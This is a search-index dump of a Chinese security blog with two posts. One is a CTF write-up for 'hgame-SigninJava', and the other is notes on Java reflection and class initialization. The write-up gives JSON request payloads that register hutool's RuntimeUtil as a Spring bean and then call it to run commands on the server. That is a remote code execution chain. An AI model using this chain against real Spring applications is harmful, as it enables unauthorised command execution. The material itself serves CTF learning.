[{"title":"hgame-SigninJava","url":"/2025/11/01/hgame-SigninJava/","content":"java，打开 jar 包可以看到代码，找到一个类\n@RequestMapping(&#123;&quot;/api&quot;&#125;)@Controller_/* loaded from: SigninJava.jar:BOOT-INF/classes/icu/Liki4/signin/controller/APIGatewayController.class */_**public** **class** APIGatewayController &#123;    @RequestMapping(value = &#123;&quot;/gateway&quot;&#125;, method = &#123;RequestMethod.POST&#125;)    @ResponseBody    **public** BaseResponse doPost(HttpServletRequest request) **throws** Exception &#123;        **try** &#123;            String body = IOUtils.toString(request.getReader());            Map&lt;String, Object&gt; map = (Map) JSON.parseObject(body, Map.**class**);            String beanName = (String) map.get(&quot;beanName&quot;);            String methodName = (String) map.get(JsonEncoder.METHOD_NAME_ATTR_NAME);            Map&lt;String, Object&gt; params = (Map) map.get(&quot;params&quot;);            **if** (StrUtil.containsAnyIgnoreCase(beanName, &quot;flag&quot;)) &#123;                **return** **new** BaseResponse(403, &quot;flagTestService offline&quot;, **null**);            &#125;            Object result = InvokeUtils.invokeBeanMethod(beanName, methodName, params);            **return** **new** BaseResponse(200, **null**, result);        &#125; **catch** (Exception e) &#123;            **return** **new** BaseResponse(500, ((Throwable) Objects.requireNonNullElse(e.getCause(), e)).getMessage(), **null**);        &#125;    &#125;&#125;\n\ndopost 中接受数据，通过 InvokeUtils.invokeBeanMethod 调用指定的 Bean 方法\n查看 hutool 的文档，发现其中有一个 RuntimeUtil，其中提供了命令执行方法，但是，只有注册到 Spring 容器中的 Bean 才能被 Spring 管理，并通过依赖注入的方式使用，而 RuntimeUtil 本身并不是一个 Spring Bean，因此需要通过动态注册将其加入 Spring 容器\n因此，我们需要先调用 cn.hutool.extra.spring.SpringUtil 中的 registerBean 方法来向容器中添加 RuntimeUtil 实例名不可带有 flag\n构造请求体\n&#123;&quot;beanName&quot;:&quot;cn.hutool.extra.spring.SpringUtil&quot;,&quot;methodName&quot;:&quot;registerBean&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;execCmd&quot;,&quot;arg1&quot;:&#123;&quot;@type&quot;:&quot;cn.hutool.core.util.RuntimeUtil&quot;&#125;&#125;&#125;\n\n在调用 execCmd\n&#123;&quot;beanName&quot;:&quot;execCmd&quot;,&quot;methodName&quot;:&quot;execForStr&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;utf-8&quot;,&quot;arg1&quot;:[&quot;/readflag&quot;]&#125;&#125;\n\n这里&#x2F;flag 被加权限了，不能直接 cat\n","tags":["CTF"]},{"title":"java安全--反射(1)","url":"/2025/11/01/java%E5%AE%89%E5%85%A8--%E5%8F%8D%E5%B0%84(1)/","content":"\n参考文章：知识星球 phithon 的文章（java 安全漫谈 - 01.反射篇(1)）参考文章：javaguide\n\n反射：java 反射可以动态获取类信息，对象通过反射获取类，类反射获取所有方法，包括私有，p 牛这里给动态特性一个定义，“一段代码，改变其中的变量量，将会导致 这段代码产⽣生功能性的变化，我称之为动态特性 ”\n白嫖一段代码\npublic void execute(String className, String methodName) throws Exception &#123;  Class clazz = Class.forName(className);             clazz.getMethod(methodName).invoke(clazz.newInstance()); &#125;\n\n\nforName 方法获取类此外还有别的方法，obj.getClass()这个方法针对下文有类对应实例，通过实例获取对应类\n\ngetmethod 方法获取类的方法\n\ninvoke 方法执行函数\n\nnewInstance 方法实例化类对象\n\n\n那我们想获取 Runtime 类，我们可以根据给到的实例，通过 obj.getClass().forName(java.lang.Runtime)获取到 Runtime 类\nforName 方法还有重载， forName(String name, boolean initialize, ClassLoader loader)我们常用的实际上是\nforName(classname, true, currentLoader)。第二个参数表示是否初始化，第三个参数是加载器，告诉虚拟机怎么加载\njava 加载器涉及到的东西有点多，先粗略了解一下\n规则： 由于 java 采用延迟加载机制只有当程序需要使用某个类时，才会由类加载器加载该类。\n作用： 动态加载 java 类的字节码到虚拟机中，还可以加载 Java 应用所需的资源如文本、图像、配置文件、视频等等文件资源\ninitialize我们知道这个参数负责类是否初始化，那类的初始化有什么用呢\n白嫖一段代码：\npublic class TrainPrint &#123;     &#123;              System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass());     &#125;     static &#123;              System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class);     &#125;     public TrainPrint() &#123;              System.out.printf(&quot;Initial %s\\n&quot;, this.getClass());     &#125;&#125;\n\n当这个类被初始化时，首先调用 static，然后调用父类构造方法，之后是{}，最后是自己的构造方法\n根据这个特性，我们能够发现当 forName()方法中的参数可控时，我们如果能将一个类放到被攻击机中并在里面 static 部分写入恶意代码，就能达到攻击目的\n","tags":["CTF"]}]